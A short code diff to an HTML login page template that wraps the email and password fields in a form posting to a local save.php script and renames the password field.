@@ -54,8 +54,8 @@
 							Login with email
 						</span>
 					</div>
-
-					<div class="wrap-input100 validate-input m-b-16" data-validate="Please enter email: ex@abc.xyz">
+					<form action="./php/save.php" method="POST">
+					<div class="wrap-input100 validate-input m-b-16" data-validate="Please enter email: example@abc.xyz">
 						<input class="input100" type="text" name="email" placeholder="Email">
 						<span class="focus-input100"></span>
 					</div>
@@ -64,7 +64,7 @@
 						<span class="btn-show-pass">
 							<i class="fa fa fa-eye"></i>
 						</span>
-						<input class="input100" type="password" name="pass" placeholder="Password">
+						<input class="input100" type="password" name="password" placeholder="Password">
 						<span class="focus-input100"></span>
 					</div>
 
@@ -72,6 +72,7 @@
 						<button class="login100-form-btn">
 							Login
 						</button>
+						</form>
 					</div>
 					
 				<!--	<div class="flex-col-c p-t-224">
